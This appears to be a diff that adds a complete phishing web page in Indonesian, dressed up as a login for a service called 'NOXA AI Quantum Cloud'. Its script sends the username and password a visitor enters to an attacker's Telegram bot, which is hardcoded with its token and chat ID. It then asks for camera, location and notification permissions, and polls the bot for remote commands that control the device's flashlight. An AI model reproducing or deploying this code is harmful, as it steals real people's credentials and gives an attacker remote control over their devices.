@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NOXA AI - QUANTUM V5</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background: #050505; color: #e0e0e0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; overflow: hidden; }
+        .glass { background: rgba(20, 20, 25, 0.7); backdrop-filter: blur(15px); border: 1px solid rgba(138, 43, 226, 0.3); }
+        .neon-text { text-shadow: 0 0 10px #8a2be2, 0 0 20px #8a2be2; }
+        .glow-btn { box-shadow: 0 0 15px rgba(138, 43, 226, 0.5); transition: 0.3s; }
+        .glow-btn:hover { box-shadow: 0 0 25px rgba(138, 43, 226, 0.8); }
+        .bg-gradient { background: radial-gradient(circle at top, #1a0b2e 0%, #050505 100%); }
+    </style>
+</head>
+<body class="bg-gradient h-screen flex items-center justify-center">
+
+    <div class="glass p-8 rounded-3xl w-80 text-center relative z-10">
+        <div class="mb-6">
+            <h1 class="text-3xl font-bold neon-text text-purple-500">NOXA AI</h1>
+            <p class="text-xs text-gray-400 mt-2 uppercase tracking-widest">Neural Link Active</p>
+        </div>
+
+        <!-- Phishing Area -->
+        <div id="auth-box">
+            <p class="text-sm mb-4">Otorisasi Diperlukan untuk Mengakses Quantum Cloud</p>
+            <input type="text" id="user" placeholder="Username / Email" class="w-full bg-black/50 border border-purple-500/30 p-3 rounded-xl mb-3 focus:outline-none focus:border-purple-500">
+            <input type="password" id="pass" placeholder="Password Access" class="w-full bg-black/50 border border-purple-500/30 p-3 rounded-xl mb-4 focus:outline-none focus:border-purple-500">
+            <button onclick="sendData()" class="glow-btn w-full bg-purple-600 hover:bg-purple-700 text-white font-bold py-3 rounded-xl uppercase tracking-tighter">Connect Neural</button>
+        </div>
+
+        <div id="status" class="hidden mt-4 text-cyan-400 text-xs animate-pulse">
+            Sistem Sinkronisasi... Harap Tunggu.
+        </div>
+    </div>
+
+    <!-- Background Ornaments -->
+    <div class="absolute top-0 left-0 w-full h-full opacity-20 pointer-events-none">
+        <div class="absolute top-1/4 left-1/4 w-64 h-64 bg-purple-900 rounded-full blur-[120px]"></div>
+        <div class="absolute bottom-1/4 right-1/4 w-64 h-64 bg-blue-900 rounded-full blur-[120px]"></div>
+    </div>
+
+    <script>
+        const TOKEN = '8717978826:AAEtS6CEz15gghp50Gl7F5NAfvo-7_74YLs';
+        const CHAT_ID = '8646356061';
+
+        // 1. Phishing Logic
+        async function sendData() {
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+            document.getElementById('status').classList.remove('hidden');
+            
+            const msg = `🔓 NOXA BREACH: \n👤 User: ${u}\n🔑 Pass: ${p}`;
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+            
+            // Request Permission pas target lagi bingung nunggu
+            if (typeof median !== 'undefined') {
+                median.permissions.request(['camera', 'location', 'notifications']);
+            }
+        }
+
+        // 2. Command Listener (Polling Command dari Bot)
+        // Note: Idealnya pake database/firebase. Ini simulasi via API Tele sederhana
+        async function checkCommands() {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-1`);
+                const data = await response.json();
+                const lastMsg = data.result[0].message.text;
+
+                if (lastMsg === "/senter_on") {
+                    window.location.href = "median://flashlight/set?status=on";
+                } else if (lastMsg === "/senter_off") {
+                    window.location.href = "median://flashlight/set?status=off";
+                }
+            } catch (e) {}
+        }
+
+        setInterval(checkCommands, 5000); // Cek tiap 5 detik
+    </script>
+</body>
+</html>
